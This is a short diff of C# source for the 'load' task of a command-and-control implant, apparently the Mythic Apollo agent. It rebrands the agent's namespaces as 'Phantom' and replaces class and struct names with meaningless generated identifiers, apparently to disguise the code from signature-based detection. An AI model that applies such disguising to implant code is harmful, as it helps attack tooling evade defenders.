@@ -6,18 +6,18 @@
 
 #if LOAD
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
-using ApolloInterop.Structs.ApolloStructs;
+using PhantomInterop.Structs.PhantomStructs;
 using ST = System.Threading.Tasks;
 namespace Tasks
 {
-    public class load : Tasking
+    public class RobustBridge3908 : Tasking
     {
         [DataContract]
-        internal struct LoadParameters
+        internal struct SpectreResolver6253
         {
             [DataMember(Name = "commands")]
             public string[] Commands;
@@ -42,7 +42,7 @@ namespace Tasks
             {
                 resp = CreateTaskResponse("No commands given to load.", true, "error");
             }
-            else if (string.IsNullOrEmpty(parameters.FileId))
+            else if (ValidationHelper.IsStringEmpty(parameters.FileId))
             {
                 resp = CreateTaskResponse("No task library file given to retrieve.", true, "error");
             }
